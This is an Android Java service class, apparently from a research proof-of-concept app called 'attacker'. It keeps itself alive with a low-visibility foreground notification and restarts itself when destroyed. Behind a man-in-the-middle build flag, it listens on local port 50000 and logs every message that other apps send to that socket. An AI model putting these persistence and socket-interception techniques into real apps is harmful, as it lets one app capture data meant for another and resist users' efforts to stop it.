package com.attacker.app.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.attacker.app.BuildConfig;
import com.attacker.app.R;
import com.attacker.app.receivers.ServiceRestarter;
import com.attacker.app.utils.Utils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class AttackerService extends Service {

    final static String TAG = AttackerService.class.getSimpleName();

    private ExecutorService executorService;
    private ServerSocket serverSocket;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Attacker Service has started.");
        // Persistent Notification: For service persistence
        createPersistentChannel();

        if(BuildConfig.SANITY_CHECK_ATTACKER_SERVICE){
            Utils.showToastEveryFiveSeconds(this,"Attacker Service is still running");
        }

        if(BuildConfig.LOCAL_SOCKET_MITM_ATTACK){
            // Initialize the executor service for local socket
            int numberOfCores = Runtime.getRuntime().availableProcessors();
            executorService = Executors.newFixedThreadPool(numberOfCores);

            // Any port > 1024 not blocked by firewall
            int portNumber = 50000;

            // Pending client connections
            executorService.execute(() -> {
                try {
                    serverSocket = new ServerSocket(portNumber);
                    Log.i(TAG,"Local Server Socket initialized, listening to port: " + portNumber);
                    while (!Thread.currentThread().isInterrupted()) {
                        Socket client = serverSocket.accept();
                        // Handle client connection in a separate thread
                        handleClientConnection(client);
                    }
                } catch (IOException e) {
                    Log.e(TAG, "Error starting server", e);
                }
            });
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, ServiceRestarter.class);
        this.sendBroadcast(broadcastIntent);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createPersistentChannel(){
        //Persistent Service
        String notificationId = getString(R.string.persistent_channel_id);
        CharSequence channelName = getString(R.string.persistent_notification_name);
        String channelDescription = getString(R.string.persistent_desc);

        NotificationChannel channel = new NotificationChannel(notificationId, channelName, NotificationManager.IMPORTANCE_NONE);
        channel.setLightColor(Color.BLUE);
        channel.setDescription(channelDescription);
        channel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(channel);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, notificationId);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Attacker Service is running.")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(2, notification);
    }

    /**
     * Handles a client connection by reading messages sent from the client and logging them.
     * This method executes the handling of the client connection in a separate thread managed by the ExecutorService.
     * It reads lines from the client's input stream and logs each message received. Upon completion, it closes the client socket.
     *
     * @param client the {@link Socket} object representing the client connection.
     */
    private void handleClientConnection(final Socket client) {
        executorService.execute(() -> {
            try {
                Log.i(TAG,"Client connected: " + client.getRemoteSocketAddress());
                InputStream inputStream = client.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

                String message;
                while ((message = reader.readLine()) != null) {
                    Log.i(TAG,"Received message: " + message);
                }
            } catch (IOException e) {
                Log.e(TAG, "Error handling client connection", e);
            } finally {
                try {
                    client.close();
                    Log.i(TAG,"Closed Client connection to " + client.getRemoteSocketAddress());
                } catch (IOException e) {
                    Log.e(TAG, "Error closing client connection", e);
                }
            }
        });
    }
}
